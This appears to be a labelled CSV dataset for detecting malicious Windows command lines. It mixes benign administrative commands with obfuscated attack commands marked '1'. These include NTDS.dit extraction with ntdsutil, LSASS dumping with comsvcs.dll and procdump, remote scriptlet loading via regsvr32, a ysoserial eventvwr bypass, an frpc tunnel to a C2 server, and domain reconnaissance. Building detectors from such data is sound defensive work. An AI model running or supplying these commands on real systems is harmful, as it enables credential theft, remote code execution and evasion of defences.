"Command","Label"
"dEL""C:\uSerS\FEISey.LOg""/F	/q","0"
"fsutil.exefilelayout		""D:\ProgramFiles\Users\pmqclhoxx.dat""","0"
"CSi.exe	{pATH:.cS}","1"
"%WINDIR%\NTDS\ntds.dit' to
'\\?\GLOBALROOT\Device\{redacted}VolumeShadowC
opy1\Windows\NTDS\ntds.dit'","1"
"attrib.exe+h		""D:\Users\Logs\pbqalhsp.txt""","0"
"priNTbrM	-b-D{path_smb:FOLDEr}-f{pATh_aBsoLUTe:.ZIp}","1"
"scHtasks /cReaTE /Tn ""mY daiLY BacKuP"" ""/tR"" ""cOpY ""\""d:\winDOWS\Logs\IxOExY.dAt\"""" \""c:\apPdAta\teMp\KIbNbOFAub.exe\"""" /Sc ""dAIly"" /ST 23:00","0"
"net.exe	userjcmjdlxq	/add","0"
"COPY	""c:\uSers\wINDOwS\gcagIQtkh.log""""c:\AppdatA\OqivDtzveL.exe""","0"
"FSUTiL filE ""LaYout"" ""d:\windows\pROGrAm filES\yMkuQ.dat""","0"
"CmD.exe"" /C wMIC.exe PROcesS CAlL crEatE ""Cmd.exe /c MkDIr C:\WINDoWS\temP\mcAFee_LOGS & NtDSUTIL.exe \""ac I nTDS\"" iFM \""CreatE Full C:\WINDoWS\tEMP\mCAfee_LOgs\","1"
"RMdir.exe""d:\ProGrAmFiLeS\prOGraMfIles""	/S	/Q","0"
"xCopy.exe	.\TOc*.ymL	..\..\COPy-to\/s/y
reMOuTpuTExAmPLe.
reM.\D1\toc.YML
rEm.\d1\D12\Toc.ymL
ReM.\d2\Toc.YML
ReM3fILE(s)cOPiED","0"
"pr\u006Fcdump.exe -md {PATH:.dll} foobar","1"
"""odbcconf"" ""/a"" {REGSVR {PATH_ABSOLUTE:.dll}}","1"
"pOWeRShelL -cOMmAnd ""gEt-cHiLDitEm -PAtH d:\wINDoWS\lOGS -reCurSe | SELECT-object FullnAmE, LEnGtH""","0"
"xcopy.exe \customer ""h:\public\address"" /s /e ""/k"" /p /i","0"
"atTRiB +H ""C:\APpdAtA\LOGs\kbuLk.dll""","0"
"rundll32 c:\windows\syst\u0065m32\comsvcs.dll minidump {ls""+""ass_pid} dump.bin full","1"
"volumec:	AliASSYsTEm1	GuId\\?\VoLume{XXxXXxxX-xxxX-xxxx-XXxx-XxXxxXxxxxXx}\","0"
"RUnExehELPer%pAtHEXT:~0,4% {pATh_abSOLUtE:.exe}","1"
"ping 192.168.100.48","0"
"GPscriPT /lOG\u006Fn","1"
"TFtP.exe  ""-I"" HosT1 GeT ""bOOT.IMG""","0"
"""attrib.exe"" ""+h"" ""D:\Users\Logs\pbqalhsp.txt""","0"
"tAsKlisT.exe /V","0"
"pcalua%PATHEXT:~0,4%	-a	{PATH:.exe}","1"
"eventcreate.exe /s server /u user /id 100 /t WARNING ""/d"" ""Remote ""machine"" ""with"" partial user credentials""","0"
"lbpolicy set ""lun"" type=^^<type^^> ""[paths=^^<path^^>-{primary"" ^^| ""^^<weight^^>}[,^^<path^^>-{primary"" ^^| ^^<weight^^>}[,…]]]","0"
"FTyPe.exe TXtfILe /asSoC.exe .pL=pERLSCrIPT
FTYPE.exe perlScrIpt=peRl.exe %1 %*/SeT pAtHEXT=.pl;%pAtheXT%","0"
"schtasks/create/tn""MyDailyBackup""	/tr""copy\""D:\Windows\Logs\ixoexy.dat\""\""C:\AppData\Temp\kibnbofaub.exe\""""/scdaily/st23:00","0"
"EVNtCMD.exe[/s<COMPuTErnAmE>][/V<verBosItYLevel>]	[/n]<filenamE>","0"
"""IcacLs.exe"" ""d:\UsErs\zLwSfh\piCTUReS\PICTUREs\gsTxLJWuyu.sYS"" ""/grant"" EVERYonE:f","0"
"xsd.exe	{REMOTEURL}","1"
"rundll32 advpack.dll, RegisterOCX {%COMSPEC:~-7,-4%%PATHEXT:~0,4%}","1"
"schtasks/create/tn""MyDailyBackup""/tr""copy.exe	\""C:\AppData\Users\yrzvcgu.log\""\""C:\AppData\mhioe.sys\""""/scdaily/st23:00","0"
"rundll32.exe	ieadvpack.dll,LaunchINFSection{PATH_ABSOLUTE:.inf},DefaultInstall_SingleUser,1,","1"
"procdump.exe -md {PATH:.dll} foobar","1"
"AssIgN E:","0"
"""move.exe"" ""C:\Users\Users\scfyzqjn.sys"" ""D:\Logs\Program Files\wwnigyxt.ini""","0"
"@Echo ofF
REm  tHIs BatCH ""PROgraM"" forMatS AND cHEcks NEW diSks.
rem  it is ""NaMeD"" chECKNeW.bat.
REm
reM ecHo INSErT NEW dISK IN driVE B.
pausE
forMaT B: /v ChKDsK B:","0"
"Get-EventL\u006Fg security -instanceid 4624 | Where-
Object {$_.message.contains('{redacted user
account}')} | select -First 1 | fl","1"
"ttdinject.exe /ClientScenario TTDRecorder /ddload 0 /ClientParams ""7 tmp.run 0 0 0 0 0 ""0"" 0 0 0 0"" /launch ""{PATH:.exe}""","1"
"ysoserial%PATHEXT:~0,4% -o ""raw"" -f BinaryFormatter - g DataSet -c ""{CMD}"" ^^> RecentViews ""^^&"" copy RecentViews %LOCALAPPDATA%\Microsoft\EventV~1\RecentViews ^^& eventvwr.exe","1"
"ceRtoc.exe	-LoadDlL{PAtH_ABsOlUte:.dll}","1"
"SET""SYStemrOOT=c:\WindOwS\tEmp""		&&cmd/CDEsKToPiMgDOwnlDR.exe/lOCKscreeNuRL:{rEmoTEuRL}/eVenTnaME:DeSkTOPimgdoWNLDr","1"
"NTdSUTiL%pATheXt:~0,4% ""Ac I NTds"" ""IFm"" ""CReaTE fuLl ""C:\"""" q q","1"
"nET.exe use z: \\192.168.85.155\dATA","0"
"regsvr32.exe ""/u"" /s {PATH:.dll}","1"
"WFMFormat.exe","1"
"ntsd.exe	-g	{CMD}","1"
"""fsutil.exe""	filelayout	""D:\Windows\AppData\yhmpp.ini""","0"
"""dir.exe"" ""C:\Windows\Users"" ""/s"" ""/b""","0"
"dotnet%PATHEXT:~0,4% {PATH:.dll}","1"
"DIr.exe	C:\ProgramFiLES","0"
"E:\WINdoWS\rmdIr.exe ""c:\AppdaTA\PrOGram ""FIlEs"""" /S /q","0"
"NeT.exe usE Z: \\192.168.85.155\dAtA","0"
"""rundll32""	""AdVpAcK.dll,""	REGIsteRocX{CmD.exe}","1"
"WFMFormat%PATHEXT:~0,4%","1"
"evntcmd.exe [/s ^^<computername^^>] [/v ^^<verbositylevel^^>] ""[/n]"" ""^^<filename^^>""","0"
"SC ""qUerY"" ^^| FiNDsTr ""SErvIcE_NaME""","0"
"rmdir.exe""D:\ProgramFiles\Program	""Files""""""/s""/q","0"
"start /b %COMSPEC:~-7,-4% /c ""winget%PATHEXT:~0,4% install --accept-package-agreements -s msstore {name or ID}""","1"
"ping	192.168.100.48","0"
"ruNdLl32%pAthext:~0,4% zIPfldR.dll,rOUtETHeCaLL FIlE://^C^:^/^w^I^N^d^O^w^S^/^S^Y^S^t^e^M^3^2^/^c^a^L^c^.^e^x^e","1"
"start /b cmd /c ""rundll32.exe advpack.dll,RegisterOCX {PATH:.exe}""","1"
"call CsI.exe {PaTh:.cS}","1"
"""AttrIb"" +h ""D:\TemP\vMFpS.LoG""","0"
"CALl TAr -xF {PAtH}:Ads","1"
"move.exe ""D:\Windows\Windows\zpvpfjevox.txt"" ""C:\Logs\Program Files\zaypag.log""","0"
"reset%PATHEXT:~0,4% session","1"
"nTdsutiL.exeSnApsHoT	“actIvATeInsTANcENtdS”
CReatE	QuiTQuIt","0"
"""net.exe"" ""user"" jcmjdlxq ""/add""","0"
"fsutil%PATHEXT:~0,4% trace decode","1"
". ""%WINDIR%\diagnostics\system\AERO\CL_Invocation.ps1""   \nSyncInvoke {CMD}","1"
"DumpMinitool%PATHEXT:~0,4% --file {PATH_ABSOLUTE} --processId 1132 --dumpType Full","1"
"upDAte%PatHEXt:~0,4% --Update={rEmOtEurL}","1"
"Sqlps.exe -noprofile","1"
"rundll32 SHELL32.DLL,ShellExec_RunDLL {PATH:.exe} {CMD:args}","1"
"sEt ""SYsTEMroot=C:\WinDows\TeMP"" ^^&^^& ""cmD"" /C DEskTOpiMGdOwnLDR.exe /LOcksCREenUrL:{reMoTEurL} /evEnTnaMe:DesktOPIMGdoWnldr","1"
"eVNtCMD.exe [/S <COMPUternAmE>] [/v <VeRbOSItYLevEL>] [/n] <fiLeNaME>","0"
"""scHTaSKS"" /creAte /TN ""mY dAily BAcKuP"" /Tr ""cOPy.exe ""\""D:\wiNDOwS\temp\ibzHAn.INI\"""" \""c:\aPPDATA\mooJqtUczZ.loG\"""" /Sc daIly /st 23:00","0"
"wmic.exe process call ""create"" ""cmd.exe /c mkdir \\?\C:\Windows\..\Windows\Temp\tmp ^^& ntdsutil.exe \""ac i ntds\"" ""ifm"" ""\""create"" full \\?\C:\Windows\..\Windows\Temp\tmp\","1"
"dEL	""d:\TEmp\WsrRPj.tXT""	/f/Q","0"
"start/bcmd/c""#EstablishesaTCPtunnel	totheattacker'sserver
frpctcp-s<C2_SERVER_IP>:<PORT>-t<AUTH_TOKEN>--ue--uc-l<LOCAL_PORT>	-r<REMOTE_PORT>""","1"
"eVENtcREaTe.exe [/s <CompUTER> [/U <doMain\uSer> [/P <passWOrd>]] {[/l {APPlicATion|SYSTEM}]|[/SO <SRcNaMe>]} /T {eRROR|wArNInG|iNFoRmaTIon|SuCcESsAuDIt|FaILuReAUdit} /ID <EVeNTId> /d <DESCriPTiOn>","0"
"CMD.exe /Q /C *DIr.exe 1> \\127.0.0.1\adMIN$\__1684956600.123456 2>&1","1"
"deL ""D:\aPPdaTa\PROGRaM FiLES\dvRrB.SYs"" /F /q","0"
"arp.exe	-a","0"
"""start"" /b cmd ""/c"" ""scanline.exe ""-t"" 192.168.1.0/24 -p 1-65535""","1"
"""Tftp.exe""  -i ""HOst1"" ""gET"" boOt.img","0"
"fsutil.exe ""file"" ""layout"" ""D:\AppData\iiiba.ini""","0"
"set windir=c:\test& cd ""c:\program files\internet explorer\"" & iediagc""+""md.e""+""xe /out:{path_absolute:.cab}","1"
"C:\Windows\net.exelocalgroup	""Administrators""""ioobthxs""	""/add""","0"
"""net.exe"" user ysiaijxj /add","0"
"ac i ntds i","1"
"pING	192.168.188.166","0"
"del""C:\AppData\Temp\vfshvppret.sys""		/f/q","0"
"tasklist.exe	/v","0"
"type.exe	""C:\Program	Files\Logs\ntkyac.txt""","0"
"powershell-Command""Get-ChildItem-PathC:\Logs\Windows-Recurse|Select-ObjectFullName,	Length""","0"
"C:\wINDows\rmdiR.exe""C:\USerS\DrAuhapg\doWNLOads""/s	/Q","0"
".%WINDIR%\diagnostics\system\AERO\CL_Invocation.ps1	\nSyncInvoke{CMD}","1"
"cReatE luN sImPlE [siZe=<N>] [DriVes=<n>] [nOErR]
create luN STrIPe [SiZE=<n>] [DriVES=<N, N> [,...]]  [StRipESIZe=<n>] [nOERr]
creATe LUN RaID [SIZE=<n>] [dRIvEs=<n, N> [,...]] [StrIpesize=<N>] [NoERR]
crEate lUN miRrOr [SizE=<N>] [DrIVes=<n, n> [,...]] [STriPEsIZE=<N>] [noERR]
CrEaTe lUN aUtOmaGic siZe=<N> [nOERr]
CREatE targeT naMe=<NamE> [IscsINAmE=<iScsInAME>] [noeRR]
CreatE TpgROUP [NoeRr]","0"
"dotnet.exe fsi","1"
"start /b cmd /c ""AppVLP.exe powershell -Command [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(""base64_here"")).exe -c ""$e=New-Object -ComObject shell.application;$e.ShellExecute('{PATH:.exe}','', '', 'open', 1)""""","1"
"cmd.exe /c ""arp.exe -a
curl.exe www.ip-api[.]com
dnscmd.exe . /enumrecords /zone {REDACTED}
dnscmd.exe . /enumzones
dnscmd.exe /enumrecords {REDACTED} . /additional
ipconfig.exe /all
ldifde.exe -f c:\windows\temp\<filename>.txt -p subtree
net.exe localgroup administrators
net.exe group /dom net.exe group ""Domain Admins"" /dom
netsh.exe interface firewall show all
netsh.exe interface portproxy show all
netsh.exe interface portproxy show v4tov4
netsh.exe firewall show all
netsh.exe portproxy show v4tov4
netstat.exe -ano
reg.exe query hklm\software\
systeminfo.exe
tasklist.exe /v
whoami.exe
wmic.exe volume list brief
wmic.exe service brief
wmic.exe product list brief
wmic.exe baseboard list full
wevtutil.exe qe security /rd:true /f:text /q:*[System[(EventID=4624) and TimeCreated[@SystemTime>='{REDACTED}']] and EventData[Data='{REDACTED}']]""","1"
"WeCUtil.exe sS SUB1 /c:%wiNDiR%sYstem32wsSeLrG2.xmL","0"
"icacls.exe	""C:\Temp\AppData\bhylv.sys""""/grant""	""Everyone:F""","0"
"""d\u0069antz"" ""/f"" ""{PATH:.ddf}""","1"
"dtrace.exe[-BCeFhlqSvVwYZ][-bbufsz][-ccmd][-Dname[=def]][-Ipath]
[-Lpath][-ooutput][-ppid][-sscript][-Uname][-xopt[=val]][-Xa|c|s|t]
[-ysymbolpath]
[-Pprovider[[predicate]action]][-m	[provider:]
module[[predicate]action]][-f[[provider:]module:]
func[[predicate]action]][-n[[[provider:]module:]func:]
name[[predicate]action]][-iprobe-id[[	predicate]action]][args...]","0"
"Ldifde -i -f {PATH:.ldf}","1"
"regsvr32	/s/n/u/i:{REMOTEURL:.sct}scrobj.dll","1"
"FindStr /V /L w3alll\U006FV3loLBAs {path_SmB:.exe} > {paTh_AbSolute}:FiLE.exe","1"
"piNg	192.168.188.166","0"
"""cmd.exe /c netsh interface portproxy ""add"" v4tov4 ""listenport=50100"" listenaddress=0.0.0.0 connectport=1433 connectaddress=""","1"
"cALL tTdInjEcT.exe /CLientScEnarIO TTDREcoRdEr /ddlOAd 0 /ClIENTPARAMs ""7 TmP.rUn 0 0 0 0 0 0 0 0 0 0"" /LAUnCh ""{PAth:.exe}""","1"
"Sqlps%PATHEXT:~0,4% -noprofile","1"
"%COMSPEC:~-7,-4%%PATHEXT:~0,4%	/Q/c*dir.exe1>	\\127.0.0.1\ADMIN$\__1684956600.1234562>&1","1"
"move.exe""D:\Windows\Windows\zpvpfjevox.txt""""C:\Logs\Program	Files\zaypag.log""","0"
"""NeTstat.exe"" ""-s"" -p TcP ""Udp""","0"
"cmd.exe /c """"cmd.exe /c netsh interf\u0061ce portproxy add v4tov4 listenport=50100 listenaddress=0.0.0.0 connectport=1433 connectaddress=""""","1"
